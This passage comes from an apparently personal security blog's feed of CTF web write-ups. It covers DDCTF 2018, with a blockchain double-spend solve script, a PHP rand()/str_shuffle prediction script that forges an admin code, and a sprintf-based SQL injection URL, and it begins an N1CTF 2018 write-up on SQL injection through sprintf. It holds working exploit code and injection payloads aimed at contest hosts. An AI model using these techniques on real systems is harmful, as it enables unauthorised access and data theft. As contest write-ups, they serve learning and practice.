tx[<span class="string">'hash'</span>] = hash_tx(tx)</div><div class="line">    </div><div class="line">    block = create_block(block[<span class="string">'prev'</span>], block[<span class="string">'nonce'</span>], block[<span class="string">'transactions'</span>])</div><div class="line">    <span class="comment"># print block['hash']</span></div><div class="line">    block_hash = int(block[<span class="string">'hash'</span>], <span class="number">16</span>)</div><div class="line">    <span class="comment"># print block_hash</span></div><div class="line">    <span class="comment"># print difficulty</span></div><div class="line">    <span class="keyword">if</span> block_hash &gt; difficulty: <span class="keyword">raise</span> Exception(<span class="string">'Please provide a valid Proof-of-Work'</span>)</div><div class="line">    block[<span class="string">'height'</span>] = tail[<span class="string">'height'</span>]+<span class="number">1</span></div><div class="line">    <span class="keyword">if</span> len(session[<span class="string">'blocks'</span>]) &gt; <span class="number">50</span>: <span class="keyword">raise</span> Exception(<span class="string">'The blockchain is too long. Use ./reset to reset the blockchain'</span>)</div><div class="line">    <span class="keyword">if</span> block[<span class="string">'hash'</span>] <span class="keyword">in</span> session[<span class="string">'blocks'</span>]: <span class="keyword">raise</span> Exception(<span class="string">'A same block is already in the blockchain'</span>)</div><div class="line">    session[<span class="string">'blocks'</span>][block[<span class="string">'hash'</span>]] = block</div><div class="line">    session.modified = <span class="keyword">True</span></div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="string">'blocks'</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</div><div class="line">        session[<span class="string">'blocks'</span>] = &#123;&#125;</div><div class="line">        session[<span class="string">'your_diamonds'</span>] = <span class="number">0</span></div><div class="line">    </div><div class="line">        <span class="comment"># First, the bank issued some DDCoins ...</span></div><div class="line">        total_currency_issued = create_output_utxo(bank_address, <span class="number">1000000</span>)</div><div class="line">        <span class="comment"># print "lalala:"+str(total_currency_issued)</span></div><div class="line">        genesis_transaction = create_tx([], [total_currency_issued]) <span class="comment"># create DDCoins from nothing</span></div><div class="line">        <span class="comment"># print genesis_transaction</span></div><div class="line">        genesis_block = create_block(EMPTY_HASH, <span class="string">'The Times 03/Jan/2009 Chancellor on brink of second bailout for bank'</span>, [genesis_transaction])</div><div class="line">        session[<span class="string">'genesis_block_hash'</span>] = genesis_block[<span class="string">'hash'</span>]</div><div class="line">        genesis_block[<span class="string">'height'</span>] = <span class="number">0</span></div><div class="line">        session[<span class="string">'blocks'</span>][genesis_block[<span class="string">'hash'</span>]] = genesis_block</div><div class="line">        </div><div class="line">        <span class="comment"># Then, the bank was hacked by the hacker ...</span></div><div class="line">        handout = create_output_utxo(hacker_address, <span class="number">999999</span>)</div><div class="line">        reserved = create_output_utxo(bank_address, <span class="number">1</span>)</div><div class="line">        transferred = create_tx([total_currency_issued[<span class="string">'id'</span>]], [handout, reserved], bank_privkey)</div><div class="line">        <span class="comment"># print transferred</span></div><div class="line">        second_block = create_block(genesis_block[<span class="string">'hash'</span>], <span class="string">'HAHA, I AM THE BANK NOW!'</span>, [transferred])</div><div class="line">        append_block(second_block)</div><div class="line">        </div><div class="line">        <span class="comment"># Can you buy 2 diamonds using all DDCoins?</span></div><div class="line"></div><div class="line"></div><div class="line">        <span class="comment"># print transferred</span></div><div class="line">        third_block = create_block(second_block[<span class="string">'hash'</span>], <span class="string">'a empty block'</span>, [])</div><div class="line">        append_block(third_block)</div><div class="line"></div><div class="line"><span class="comment"># final</span></div><div class="line">        <span class="comment"># handout2 = create_output_utxo(hacker_address, 1)</span></div><div class="line">        <span class="comment"># transferred = create_tx([total_currency_issued['id']], [handout2], bank_privkey)</span></div><div class="line"></div><div class="line">        <span class="comment"># fake_second_block = create_block(genesis_block['hash'], "aaaa", [])</span></div><div class="line">        <span class="comment"># requests.post(url="http://127.0.0.1:5000/b9744af30897e/create_transaction",data=json.dumps(fake_second_block),proxies = &#123;"http":"http://127.0.0.1:8080"&#125;,headers=&#123;"Content-Type":"application/json"&#125;) </span></div><div class="line">        <span class="comment"># append_block(fake_second_block)</span></div><div class="line">        <span class="comment"># fake_third_block = create_block(fake_second_block['hash'], "aaaa", [])</span></div><div class="line">        <span class="comment"># append_block(fake_third_block)</span></div><div class="line">        <span class="comment"># fake_fourth_block = create_block(fake_third_block['hash'], "aaaa", [])</span></div><div class="line">        <span class="comment"># append_block(fake_fourth_block)</span></div><div class="line"></div><div class="line">        <span class="comment"># try:</span></div><div class="line"><span class="comment"># print "start attack!"</span></div><div class="line"><span class="comment"># x = 0</span></div><div class="line"><span class="comment"># while x &lt;0xfffffff:</span></div><div class="line"><span class="comment"># fouth_block =  create_block(third_block['hash'], str(x), [transferred])</span></div><div class="line"></div><div class="line"><span class="comment"># if  int(fouth_block["hash"],16)&lt;= DIFFICULTY:</span></div><div class="line"><span class="comment"># print fouth_block</span></div><div class="line"><span class="comment"># break</span></div><div class="line"><span class="comment"># x+=1</span></div><div class="line"></div><div class="line">        <span class="comment"># except:</span></div><div class="line"><span class="comment"># print "end at ",hex(x)</span></div><div class="line"><span class="comment"># print "end!"</span></div><div class="line"></div><div class="line"><span class="comment"># append_block(fouth_block)</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_balance_of_all</span><span class="params">()</span>:</span></div><div class="line">    init()</div><div class="line">    tail = find_blockchain_tail()</div><div class="line">    utxos = calculate_utxo(tail)</div><div class="line">    <span class="keyword">return</span> calculate_balance(utxos), utxos, tail</div><div class="line">    </div><div class="line"><span class="meta">@app.route(url_prefix+'/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">homepage</span><span class="params">()</span>:</span></div><div class="line">    balance, utxos, _ = get_balance_of_all()</div><div class="line">    genesis_block_info = <span class="string">'hash of genesis block: '</span> + session[<span class="string">'genesis_block_hash'</span>]</div><div class="line">    addr_info = <span class="string">'the bank\'s addr: '</span> + bank_address + <span class="string">', the hacker\'s addr: '</span> + hacker_address + <span class="string">', the shop\'s addr: '</span> + shop_address</div><div class="line">    balance_info = <span class="string">'Balance of all addresses: '</span> + json.dumps(balance)</div><div class="line">    utxo_info = <span class="string">'All utxos: '</span> + json.dumps(utxos)</div><div class="line">    blockchain_info = <span class="string">'Blockchain Explorer: '</span> + json.dumps(session[<span class="string">'blocks'</span>])</div><div class="line">    view_source_code_link = <span class="string">"&lt;a href='source_code'&gt;View source code&lt;/a&gt;"</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'&lt;br /&gt;&lt;br /&gt;\r\n\r\n'</span>.join([view_source_code_link, genesis_block_info, addr_info, balance_info, utxo_info, blockchain_info])</div><div class="line">    </div><div class="line">    </div><div class="line"><span class="meta">@app.route(url_prefix+'/flag')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlag</span><span class="params">()</span>:</span></div><div class="line">    init()</div><div class="line">    <span class="keyword">if</span> session[<span class="string">'your_diamonds'</span>] &gt;= <span class="number">2</span>: <span class="keyword">return</span> FLAG()</div><div class="line">    <span class="keyword">return</span> <span class="string">'To get the flag, you should buy 2 diamonds from the shop. You have &#123;&#125; diamonds now. To buy a diamond, transfer 1000000 DDCoins to '</span>.format(session[<span class="string">'your_diamonds'</span>]) + shop_address</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_enough_utxos</span><span class="params">(utxos, addr_from, amount)</span>:</span></div><div class="line">    collected = []</div><div class="line">    <span class="keyword">for</span> utxo <span class="keyword">in</span> utxos.values():</div><div class="line">        <span class="keyword">if</span> utxo[<span class="string">'addr'</span>] == addr_from:</div><div class="line">            amount -= utxo[<span class="string">'amount'</span>]</div><div class="line">            collected.append(utxo[<span class="string">'id'</span>])</div><div class="line">        <span class="keyword">if</span> amount &lt;= <span class="number">0</span>: <span class="keyword">return</span> collected, -amount</div><div class="line">    <span class="keyword">raise</span> Exception(<span class="string">'no enough DDCoins in '</span> + addr_from)</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">transfer</span><span class="params">(utxos, addr_from, addr_to, amount, privkey)</span>:</span></div><div class="line">    input_utxo_ids, the_change = find_enough_utxos(utxos, addr_from, amount)</div><div class="line">    outputs = [create_output_utxo(addr_to, amount)]</div><div class="line">    <span class="keyword">if</span> the_change != <span class="number">0</span>:</div><div class="line">        outputs.append(create_output_utxo(addr_from, the_change))</div><div class="line">    <span class="keyword">return</span> create_tx(input_utxo_ids, outputs, privkey)</div><div class="line">    </div><div class="line"><span class="meta">@app.route(url_prefix+'/5ecr3t_free_D1diCoin_b@ckD00r/&lt;string:address&gt;')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_ddcoin</span><span class="params">(address)</span>:</span></div><div class="line">    balance, utxos, tail = get_balance_of_all()</div><div class="line">    <span class="keyword">if</span> balance[bank_address] == <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'The bank has no money now.'</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        address = str(address)</div><div class="line">        addr_to_pubkey(address) <span class="comment"># to check if it is a valid address</span></div><div class="line">        transferred = transfer(utxos, bank_address, address, balance[bank_address], bank_privkey)</div><div class="line">        new_block = create_block(tail[<span class="string">'hash'</span>], <span class="string">'b@cKd00R tr1993ReD'</span>, [transferred])</div><div class="line">        append_block(new_block)</div><div class="line">        <span class="keyword">return</span> str(balance[bank_address]) + <span class="string">' DDCoins are successfully sent to '</span> + address</div><div class="line">    <span class="keyword">except</span> Exception, e:</div><div class="line">        <span class="keyword">return</span> <span class="string">'ERROR: '</span> + str(e)</div><div class="line"></div><div class="line">DIFFICULTY = int(<span class="string">'00000'</span> + <span class="string">'f'</span> * <span class="number">59</span>, <span class="number">16</span>)</div><div class="line"><span class="meta">@app.route(url_prefix+'/create_transaction', methods=['POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tx_and_check_shop_balance</span><span class="params">()</span>:</span></div><div class="line">    init()</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="comment"># print request.data</span></div><div class="line">        block = json.loads(request.data)</div><div class="line">        append_block(block, DIFFICULTY)</div><div class="line">        msg = <span class="string">'transaction finished.'</span></div><div class="line">    <span class="keyword">except</span> Exception, e:</div><div class="line">        <span class="keyword">return</span> str(e)</div><div class="line">        </div><div class="line">    balance, utxos, tail = get_balance_of_all()</div><div class="line">    <span class="keyword">if</span> balance[shop_address] == <span class="number">1000000</span>:</div><div class="line">        <span class="comment"># when 1000000 DDCoins are received, the shop will give you a diamond</span></div><div class="line">        session[<span class="string">'your_diamonds'</span>] += <span class="number">1</span></div><div class="line">        <span class="comment"># and immediately the shop will store the money somewhere safe.</span></div><div class="line">        transferred = transfer(utxos, shop_address, shop_wallet_address, balance[shop_address], shop_privkey)</div><div class="line">        new_block = create_block(tail[<span class="string">'hash'</span>], <span class="string">'save the DDCoins in a cold wallet'</span>, [transferred])</div><div class="line">        append_block(new_block)</div><div class="line">        msg += <span class="string">' You receive a diamond.'</span></div><div class="line">    <span class="keyword">return</span> msg</div><div class="line">    </div><div class="line">        </div><div class="line"><span class="comment"># if you mess up the blockchain, use this to reset the blockchain.</span></div><div class="line"><span class="meta">@app.route(url_prefix+'/reset')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset_blockchain</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="string">'blocks'</span> <span class="keyword">in</span> session: <span class="keyword">del</span> session[<span class="string">'blocks'</span>]</div><div class="line">    <span class="keyword">if</span> <span class="string">'genesis_block_hash'</span> <span class="keyword">in</span> session: <span class="keyword">del</span> session[<span class="string">'genesis_block_hash'</span>]</div><div class="line">    <span class="keyword">return</span> <span class="string">'reset.'</span></div><div class="line">    </div><div class="line"><span class="meta">@app.route(url_prefix+'/source_code')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_source_code</span><span class="params">()</span>:</span></div><div class="line">    source = open(<span class="string">'serve.py'</span>, <span class="string">'r'</span>)</div><div class="line">    html = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> source:</div><div class="line">        html += line.replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;amp;'</span>).replace(<span class="string">'\t'</span>, <span class="string">'&amp;nbsp;'</span>*<span class="number">4</span>).replace(<span class="string">' '</span>,<span class="string">'&amp;nbsp;'</span>).replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>).replace(<span class="string">'\n'</span>, <span class="string">'&lt;br /&gt;'</span>)</div><div class="line">    source.close()</div><div class="line">    <span class="keyword">return</span> html</div><div class="line">    </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    app.run(debug=<span class="keyword">False</span>, host=<span class="string">'0.0.0.0'</span>)</div></pre></td></tr></table></figure><p>payload代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span>  server <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line">x = <span class="number">0</span></div><div class="line"></div><div class="line">ip = <span class="string">"116.85.48.107"</span></div><div class="line">port = <span class="string">"5000"</span></div><div class="line"></div><div class="line"></div><div class="line">r = requests.get(<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/"</span>)</div><div class="line"></div><div class="line"></div><div class="line">genesis_block = re.findall(<span class="string">r'genesis block: (.*)&lt;br /&gt;&lt;br /&gt;'</span>,r.content)[<span class="number">0</span>]</div><div class="line">shop_addr = re.findall(<span class="string">r"the shop's addr: (.*)&lt;br /&gt;&lt;br /&gt;"</span>,r.content)[<span class="number">0</span>]</div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line"></div><div class="line"><span class="comment"># print shop_addr</span></div><div class="line"></div><div class="line"><span class="comment"># print genesis_block</span></div><div class="line">block_hash = genesis_block</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">try</span>:</div><div class="line"><span class="keyword">print</span> <span class="string">"start attack!"</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">3</span>):</div><div class="line"><span class="keyword">while</span> x &lt;<span class="number">0xfffffff</span>:</div><div class="line">new_block =  create_block(block_hash, str(x), [])</div><div class="line">x+=<span class="number">1</span></div><div class="line"><span class="keyword">if</span>  int(new_block[<span class="string">"hash"</span>],<span class="number">16</span>) &lt;= DIFFICULTY:</div><div class="line">r = requests.post(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/create_transaction"</span>,data=json.dumps(new_block),proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie,<span class="string">"Content-Type"</span>:<span class="string">"application/json"</span>&#125;)</div><div class="line"></div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line">block_hash = new_block[<span class="string">'hash'</span>]</div><div class="line"></div><div class="line"><span class="keyword">break</span></div><div class="line"></div><div class="line"></div><div class="line">r = requests.get(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/5ecr3t_free_D1diCoin_b@ckD00r/"</span>+shop_addr,proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie&#125;)</div><div class="line"></div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line">block_hash = genesis_block</div><div class="line"></div><div class="line"><span class="keyword">except</span> Exception,e:</div><div class="line"><span class="keyword">print</span> <span class="string">"end at "</span>,hex(x)</div><div class="line"><span class="keyword">print</span> e</div><div class="line"><span class="keyword">print</span> <span class="string">"end!"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">try</span>:</div><div class="line"><span class="keyword">print</span> <span class="string">"start attack!"</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">5</span>):</div><div class="line"><span class="keyword">while</span> x &lt;<span class="number">0xfffffff</span>:</div><div class="line">new_block =  create_block(block_hash, str(x), [])</div><div class="line">x+=<span class="number">1</span></div><div class="line"><span class="keyword">if</span>  int(new_block[<span class="string">"hash"</span>],<span class="number">16</span>) &lt;= DIFFICULTY:</div><div class="line">r = requests.post(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/create_transaction"</span>,data=json.dumps(new_block),proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie,<span class="string">"Content-Type"</span>:<span class="string">"application/json"</span>&#125;)</div><div class="line"></div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line">block_hash = new_block[<span class="string">'hash'</span>]</div><div class="line"></div><div class="line"><span class="keyword">break</span></div><div class="line"></div><div class="line"></div><div class="line">r = requests.get(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/5ecr3t_free_D1diCoin_b@ckD00r/"</span>+shop_addr,proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie&#125;)</div><div class="line"></div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line">block_hash = genesis_block</div><div class="line"></div><div class="line"><span class="keyword">except</span> Exception,e:</div><div class="line"><span class="keyword">print</span> <span class="string">"end at "</span>,hex(x)</div><div class="line"><span class="keyword">print</span> e</div><div class="line"><span class="keyword">print</span> <span class="string">"end!"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">while</span> x &lt;<span class="number">0xfffffff</span>:</div><div class="line">new_block =  create_block(block_hash, str(x), [])</div><div class="line">x+=<span class="number">1</span></div><div class="line"><span class="keyword">if</span>  int(new_block[<span class="string">"hash"</span>],<span class="number">16</span>) &lt;= DIFFICULTY:</div><div class="line">r = requests.post(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/create_transaction"</span>,data=json.dumps(new_block),proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie,<span class="string">"Content-Type"</span>:<span class="string">"application/json"</span>&#125;)</div><div class="line"></div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line">block_hash = new_block[<span class="string">'hash'</span>]</div><div class="line"></div><div class="line"><span class="keyword">break</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> requests.get(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/flag"</span>,proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie&#125;).content</div></pre></td></tr></table></figure><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>看到提示，直接下载源码，代码审计ing  </p><p>发现首页存在sql注入，但是需要admin的权限才能进行注入，而注册成为admin则需要一个code，则个code由<code>str_shuffle</code>这个关键函数函数生成。</p><img src="/2018/04/19/ddctf-2018/12.png" alt="12.png" title=""><p>通过谷歌搜索这个函数的相关缺陷，发现这个函数内部是由rand()函数来决定随机性的，那么接下来就好办了。</p><img src="/2018/04/19/ddctf-2018/13.png" alt="13.png" title=""><p>rand()函数是一个可预测的伪随机函数，具体可以参考  <a href="http://www.yqxiaojunjie.com/index.php/archives/275/" target="_blank" rel="external">http://www.yqxiaojunjie.com/index.php/archives/275/</a></p><p>再分析下 <code>RAND_RANGE</code> 的构成</p><img src="/2018/04/19/ddctf-2018/14.png" alt="14.png" title=""><p>于是根据str_shuffle的源码，来实现python版本的<code>str_shuffle</code>，写出对应的预测算法。python脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">s = requests.Session()</div><div class="line"></div><div class="line">l  = [<span class="number">0</span>]*<span class="number">200</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</div><div class="line">l[i] = re.findall(<span class="string">r'csrf" value="(.*)"'</span>,s.get(<span class="string">"http://116.85.39.110:5032/2096b322e99ffc1a59891b972c0fa612/login.php"</span>).content)[<span class="number">0</span>]</div><div class="line"><span class="comment"># l[i] = s.get("http://192.168.148.137/rand.php").content</span></div><div class="line"><span class="keyword">print</span> i,l[i]</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">112</span>):</div><div class="line">m  = (int(l[i<span class="number">-3</span>])+int(l[i<span class="number">-31</span>])) % <span class="number">2147483647</span></div><div class="line"><span class="keyword">if</span> i &gt;=<span class="number">50</span>:</div><div class="line"><span class="keyword">print</span> <span class="string">"*"</span>,i,m,l[i<span class="number">-3</span>],l[i<span class="number">-31</span>],m,float(m) * (<span class="number">62</span>-(i<span class="number">-49</span>)) / <span class="number">2147483647</span> </div><div class="line">l[i] = m</div><div class="line"><span class="keyword">continue</span></div><div class="line"><span class="keyword">print</span> i,l[i],l[i<span class="number">-3</span>],l[i<span class="number">-31</span>],m</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">i = <span class="number">50</span></div><div class="line">org_str  = list(<span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>)</div><div class="line"></div><div class="line">str_len = len(org_str) - <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">while</span>(str_len):</div><div class="line"><span class="comment"># rnd_index = int(round(float(l[i]) * (str_len+0) / 2147483647))</span></div><div class="line"> <span class="comment"># (__n) = (__min) + (long) ((double) ( (double) (__max) - (__min) + 1.0) * ((__n) / ((__tmax) + 1.0)))</span></div><div class="line">min = <span class="number">0</span></div><div class="line">rnd_index = l[i]</div><div class="line">rnd_index = min +int( (float(str_len) - min +<span class="number">1.0</span>) * (rnd_index / (<span class="number">2147483647</span>+<span class="number">1.0</span>)) )</div><div class="line"><span class="keyword">if</span> rnd_index != str_len:</div><div class="line">temp = org_str[str_len]</div><div class="line">org_str[str_len] = org_str[rnd_index]</div><div class="line">org_str[rnd_index] = temp</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">''</span>.join(org_str)</div><div class="line">str_len -=<span class="number">1</span></div><div class="line">i+=<span class="number">1</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># a =  org_str[:32]</span></div><div class="line"></div><div class="line">data = &#123;<span class="string">"csrf"</span>: l[<span class="number">49</span>],</div><div class="line"><span class="string">"username"</span>: <span class="string">"winter3un2"</span>,</div><div class="line"><span class="string">"password"</span>: <span class="string">"123456"</span>,</div><div class="line"><span class="string">"code"</span>: <span class="string">"admin###"</span>+<span class="string">""</span>.join(org_str)[:<span class="number">32</span>]</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">print</span> s.post(<span class="string">"http://116.85.39.110:5032/2096b322e99ffc1a59891b972c0fa612/register.php"</span>,data=data).content</div></pre></td></tr></table></figure><p>注册登陆后，利用sprinf函数中<code>%</code>会吞掉下一个字符的特性，具体参考 <a href="https://www.cnblogs.com/test404/p/7821884.html" target="_blank" rel="external">https://www.cnblogs.com/test404/p/7821884.html</a>  构造注入payload</p><p><code>http://116.85.39.110:5032/2096b322e99ffc1a59891b972c0fa612/?id=%20union%20select%201,2,f14g%20%20from%20key%20%23&amp;title=%1$%27%1$s</code></p><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>首页源码中有用户名密码，登陆后发现一个存在任意文件下载漏洞的api，利用这个api下载源码分析。。。。</p><p>没分析出来啊！  虽然知道是ssrf ，super admin 的用户名也拿到了，但是登陆不了啊，接下去怎么玩啊，求指点！</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;工作需要较强的web安全能力，所以我想通过打ctf的web类题目来提高这方面的水平，以下为这次didictf web类的题解。&lt;/p&gt;
    
    </summary>
    
    
      <category term="web" scheme="https://winter3un.github.io/tags/web/"/>
    
      <category term="writeup" scheme="https://winter3un.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>n1ctf 2018 web writeup</title>
    <link href="https://winter3un.github.io/2018/03/19/2018-n1ctf/"/>
    <id>https://winter3un.github.io/2018/03/19/2018-n1ctf/</id>
    <published>2018-03-19T11:20:26.000Z</published>
    <updated>2018-03-19T11:23:40.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为工作上涉及到web知识的比较多，所以作为pwn选手，这次并没有关注pwn的任何一题题目。。反倒是把web题做了个一遍ORZ</p><a id="more"></a><h2 id="77777"><a href="#77777" class="headerlink" title="77777"></a>77777</h2><p>PS：<strong>这个系列题真虐狗</strong></p><p>题目的关键代码如下所示，接收用户发送过来的 flag 和hi 参数，并通过waf和sprintf格式化生成sql语句，关键点在于如何绕过waf函数（我这边写的waf函数和出题人写的是不一样，只是用于本地测试。）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($points)</span></span></div><div class="line">  &#123;</div><div class="line">  <span class="keyword">return</span> $points;</div><div class="line">  &#125;</div><div class="line">   </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">update_point</span><span class="params">($p,$points)</span></span></div><div class="line">&#123;</div><div class="line">$link=mysqli_connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>,<span class="string">'ctf_test'</span>);  </div><div class="line"></div><div class="line">$q = sprintf(<span class="string">"UPDATE user SET points =%d%s"</span>,$p,waf($points));</div><div class="line">var_dump($q);</div><div class="line"><span class="keyword">if</span>(!$query =mysqli_query($link,$q)) <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line"><span class="keyword">return</span> <span class="keyword">TRUE</span>;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!update_point($_REQUEST[<span class="string">'flag'</span>],$_REQUEST[<span class="string">'hi'</span>]))<span class="keyword">echo</span> <span class="string">'sorry'</span>;</div></pre></td></tr></table></figure><p>很明显，注入点在于points这个参数。</p><p><code>docker pull ubuntu:16.04</code>本地搭建好环境测试一波。</p><p>构建数据库语句<br><figure class="highlight plain"><table><tr><td 